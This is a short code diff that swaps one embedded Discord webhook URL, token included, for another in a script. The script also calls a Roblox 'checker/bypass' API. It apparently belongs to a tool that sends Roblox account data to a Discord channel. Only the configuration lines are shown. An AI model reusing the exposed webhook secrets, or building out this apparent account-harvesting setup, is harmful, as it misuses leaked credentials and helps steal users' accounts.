@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function() {
   // IMPORTANT: Replace this with your Discord webhook URL
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1361949829474816112/MF6rRmldFGeuSb7yeJarmj4HX1q-dlwppegVXa2MaCzUYYj3I1n5rgSBPZirkjlOkKSO";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1461633934101053552/IhUbmHtj_YV8f96PDZa7kCZ8ao4-atRqtIqD9-ujWCKv8R7Zye1gss2LwGDIawebUFXf";
   
   // Your API endpoint
   const BYPASS_API_URL = "https://rblx-checker-infos.vercel.app/api/bypass";
